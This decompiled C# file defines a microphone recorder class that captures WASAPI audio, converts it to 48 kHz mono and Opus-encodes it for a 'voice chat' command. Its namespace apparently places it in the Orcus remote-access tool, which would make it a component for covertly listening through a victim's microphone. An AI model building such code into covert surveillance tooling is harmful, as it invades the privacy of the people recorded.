using System;
using CSCore;
using CSCore.CoreAudioAPI;
using CSCore.SoundIn;
using CSCore.Streams;
using OpusWrapper;
using OpusWrapper.Native;
using Orcus.Shared.Commands.VoiceChat;
using Orcus.Shared.Data;

namespace Orcus.Commands.VoiceChat.Utilities;

public class CSCoreRecorder : IDisposable
{
	private readonly MMDevice _captureDevice;

	private readonly bool _triggerSingleBlockRead;

	private IWaveSource _captureSource;

	private WasapiCapture _wasapiCapture;

	private readonly OpusEncoder _opusEncoder;

	private readonly int _bytesPerSegment;

	private const int SegmentFrames = 960;

	private byte[] _notEncodedBuffer;

	public event EventHandler<SingleBlockReadEventArgs> SingleBlockRead;

	public event EventHandler<DataInfoAvailableEventArgs> DataAvailable;

	public CSCoreRecorder(MMDevice captureDevice, bool triggerSingleBlockRead, int bitrate, Application application)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		_captureDevice = captureDevice;
		_triggerSingleBlockRead = triggerSingleBlockRead;
		_opusEncoder = OpusEncoder.Create(48000, 1, application);
		_opusEncoder.set_Bitrate(bitrate);
		_bytesPerSegment = _opusEncoder.FrameByteCount(960);
	}

	public void Dispose()
	{
		WasapiCapture wasapiCapture = _wasapiCapture;
		if (wasapiCapture != null)
		{
			wasapiCapture.Stop();
		}
		((IDisposable)_captureSource)?.Dispose();
		WasapiCapture wasapiCapture2 = _wasapiCapture;
		if (wasapiCapture2 != null)
		{
			wasapiCapture2.Dispose();
		}
		OpusEncoder opusEncoder = _opusEncoder;
		if (opusEncoder != null)
		{
			opusEncoder.Dispose();
		}
	}

	public virtual void Initialize()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		WasapiCapture val = new WasapiCapture();
		val.set_Device(_captureDevice);
		_wasapiCapture = val;
		_wasapiCapture.Initialize();
		SoundInSource val2 = new SoundInSource((ISoundIn)(object)_wasapiCapture);
		if (_triggerSingleBlockRead)
		{
			SingleBlockNotificationStream val3 = new SingleBlockNotificationStream(FluentExtensions.ToSampleSource(FluentExtensions.ToMono(FluentExtensions.ChangeSampleRate((IWaveSource)(object)val2, 48000))));
			val3.add_SingleBlockRead((EventHandler<SingleBlockReadEventArgs>)NotificationStreamOnSingleBlockRead);
			_captureSource = FluentExtensions.ToWaveSource((ISampleSource)(object)val3, 16);
		}
		else
		{
			_captureSource = FluentExtensions.ToWaveSource(FluentExtensions.ToSampleSource(FluentExtensions.ToMono(FluentExtensions.ChangeSampleRate((IWaveSource)(object)val2, 48000))), 16);
		}
		val2.add_DataAvailable((EventHandler<DataAvailableEventArgs>)SoundInSourceOnDataAvailable);
		_wasapiCapture.Start();
	}

	private void NotificationStreamOnSingleBlockRead(object sender, SingleBlockReadEventArgs e)
	{
		this.SingleBlockRead?.Invoke(this, e);
	}

	private unsafe void SoundInSourceOnDataAvailable(object sender, DataAvailableEventArgs e)
	{
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Expected O, but got Unknown
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		//IL_0122: Expected O, but got Unknown
		byte[] array = new byte[e.get_ByteCount()];
		int num;
		int num6 = default(int);
		while ((num = ((IReadableAudioSource<byte>)(object)_captureSource).Read(array, 0, array.Length)) > 0)
		{
			byte[] notEncodedBuffer = _notEncodedBuffer;
			int num2 = ((notEncodedBuffer != null) ? notEncodedBuffer.Length : 0);
			byte[] array2 = new byte[num + num2];
			if (num2 > 0)
			{
				Buffer.BlockCopy(_notEncodedBuffer, 0, array2, 0, num2);
			}
			Buffer.BlockCopy(array, 0, array2, num2, num);
			int num3 = (int)Math.Floor((double)array2.Length / (double)_bytesPerSegment);
			int num4 = num3 * _bytesPerSegment;
			int num5 = array2.Length - num4;
			_notEncodedBuffer = new byte[num5];
			Buffer.BlockCopy(array2, num4, _notEncodedBuffer, 0, num5);
			if (num3 == 0)
			{
				break;
			}
			byte[][] array3 = new byte[num3][];
			int[] array4 = new int[num3];
			fixed (byte* ptr = array2)
			{
				for (int i = 0; i < num3; i++)
				{
					array3[i] = _opusEncoder.Encode(ptr + _bytesPerSegment * i, _bytesPerSegment, ref num6);
					array4[i] = num6;
				}
			}
			this.DataAvailable?.Invoke(this, new DataInfoAvailableEventArgs((IDataInfo)new VoiceChatDataInfo(array3, array4)));
		}
	}
}
